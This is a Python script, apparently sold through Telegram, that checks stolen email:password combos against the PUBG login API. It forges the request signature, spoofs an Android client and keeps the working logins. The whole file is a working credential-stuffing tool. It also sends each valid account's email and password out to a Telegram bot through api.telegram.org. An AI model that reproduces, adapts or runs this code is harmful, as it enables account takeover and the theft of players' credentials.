import requests
import hashlib
import random
from time import sleep
import string
d = 0
print(f"""\x1b[32;1m


░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗
██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝
██║░░╚═╝███████║█████╗░░███████║█████═╝░
██║░░██╗██╔══██║██╔══╝░░██╔══██║██╔═██╗░
╚█████╔╝██║░░██║███████╗██║░░██║██║░╚██╗
░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝

███╗░░██╗██╗░░░██╗███╗░░░███╗██████╗░██████╗░
████╗░██║██║░░░██║████╗░████║██╔══██╗██╔══██╗
██╔██╗██║██║░░░██║██╔████╔██║██████╦╝██████╔╝
██║╚████║██║░░░██║██║╚██╔╝██║██╔══██╗██╔══██╗
██║░╚███║╚██████╔╝██║░╚═╝░██║██████╦╝██║░░██║
╚═╝░░╚══╝░╚═════╝░╚═╝░░░░░╚═╝╚═════╝░╚═╝░░╚═╝

██╗░░░░░██╗███╗░░██╗██╗░░██╗
██║░░░░░██║████╗░██║██║░██╔╝
██║░░░░░██║██╔██╗██║█████═╝░
██║░░░░░██║██║╚████║██╔═██╗░
███████╗██║██║░╚███║██║░╚██╗
╚══════╝╚═╝╚═╝░░╚══╝╚═╝░░╚═╝

██████╗░██╗░░░██╗██████╗░░██████╗░
██╔══██╗██║░░░██║██╔══██╗██╔════╝░
██████╔╝██║░░░██║██████╦╝██║░░██╗░
██╔═══╝░██║░░░██║██╔══██╗██║░░╚██╗
██║░░░░░╚██████╔╝██████╦╝╚██████╔╝
╚═╝░░░░░░╚═════╝░╚═════╝░░╚═════╝░
\033[1;90m     


     ______________________________________
\033[1;90m    |\033[1;92m-1*\033[1;97mAuther              \033[1;90m>>\033[1;91mTarmay_Rash  \033[1;90m|
\033[1;90m    |\033[1;92m-2*\033[1;97mName Chanel Telegram\033[1;90m>>\033[1;91mTermux_Kalili\033[1;90m|
\033[1;90m    |\033[1;92m-3*\033[1;97mUser Name Auther    \033[1;90m>>\033[1;91m@sell_pubg9  \033[1;90m|
\033[1;90m    |\033[1;92m-4*\033[1;97mUser Name Chanel    \033[1;90m>>\033[1;91m@darkweeb9   \033[1;90m|
\033[1;91m%%%%\033[1;90m|\033[1;92m-5*\033[1;97mThis tool Is Made   \033[1;90m>>\033[1;91mTaramy_Rash  \033[1;90m|\033[1;91m%%%%
\033[1;97m=\033[1;93m--\033[1;97m=\033[1;90m|\033[1;92m-6*\033[1;97mAll Tool Here \033[1;91mFB_ins_twe_pubg_li_r \033[1;90m|\033[1;97m=\033[1;93m--\033[1;97m=
\033[1;92m%%%%\033[1;90m|\033[1;92m-7*\033[1;97mDo You Have Buy                    \033[1;90m|\033[1;92m%%%%
\033[1;90m    |\033[1;92m-8*\033[1;97m1Hafta \033[1;90m>>\033[1;91m10 fastpay and korek      \033[1;90m|
\033[1;90m    |\033[1;92m-9*\033[1;97m1Mang\033[1;90m>>\033[1;91m15Fastpay and korek         \033[1;90m|
\033[1;90m    |\033[1;92m-10*\033[1;97mHatahatya \033[1;90m>>\033[1;91mFastpay aned korek    \033[1;90m|
\033[1;90m    |______________________________________|
\033[1;90m            |\033[1;92mBo Kreen \033[1;97m@sell_pubg9|
\033[1;90m            |____________________|


 
""")
ID = input("Enter Your ID: ")
token = input("Enter Your Token: ")
combos = open("acc.txt", "r").read().splitlines()
for combo in combos:
    try:
        combo = combo.split(":")
    except:
        print("Invalid Combo")
        exit()
    user = combo[0]
    passw = combo[1]
    bruted_text = f""" 𓆩Pubg Checker𓆪
    \n————————————————
    E-mail: {user}
    Pass: {passw}
    Div ==> @darkweeb9    CH ==> @darkweeb9 ✓
    ————————————————\n"""
    token11 = hashlib.md5(bytes(f'{passw}', encoding='utf-8')).hexdigest()
    token22 = hashlib.md5(bytes(
        "/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\"" + user + "\",\"account_type\":2,\"area_code\":\"964\",\"extra_json\":\"\",\"password\":\"" + token11 + "\"}3ec8cd69d71b7922e2a17445840866b26d86e283",
        encoding="utf-8")).hexdigest()
    tokenpriv11 = ""
    for i in range(6):
        tokenpriv11 += "".join(random.choice(string.digits))
    tokenpriv11 += "."
    for i in range(3):
        tokenpriv11 += "".join(random.choice(string.digits))
    headers2 = {
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.{tokenpriv11})",
        "Host": "igame.msdkpass.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip, deflate",
        "Content-Length": "122",
    }
    data2 = "{\"account\":\"" + user + "\",\"account_type\":2,\"area_code\":\"964\",\"extra_json\":\"\",\"password\":\"" + token11 + "\"}"
    r2 = requests.get(
        f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={token22}",
        data=data2, headers=headers2)
    d += 1
    if "token" in r2.text:
        print(f"\x1b[32;1m[{d}]\x1b[32;1m [good]\x1b[37;1m {user}:{passw} ")
        with open("PUBG_Available.txt", "a") as m:
            m.write(bruted_text)
            requests.get(
                f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ 𓆩Pubg Checker𓆪\n𝖷𝗑----------𝗑---------------𝗑---------𝗑𝖷\n• ࿈ ( Eamil : {user}\n• ࿈ ( Pass : {passw}\n𝖷𝗑-----------𝗑---------------𝗑-----------𝗑𝖷\nDiv ==> @darkweeb9    CH ==> @darkweeb9✓')
    elif '"msg":"Params Email is other format!"' in r2.text:
        print(f"\x1b[31;1m[{d}]\x1b[31;1m [bad]\x1b[39;1m {user}:{passw} ")
    elif '"msg":"Params Email Format is Error!"' in r2.text:
        print(f"\x1b[31;1m[{d}]\x1b[31;1m [bad]\x1b[39;1m {user}:{passw} ")
    elif '"msg":"the account does not exists!"' in r2.text:
        print(f"\x1b[31;1m[{d}]\x1b[31;1m [bad]\x1b[39;1m {user}:{passw} ")
    elif '"msg":"wrong password!"' in r2.text:
        print(f"\x1b[31;1m[{d}]\x1b[31;1m [bad]\x1b[39;1m {user}:{passw} ")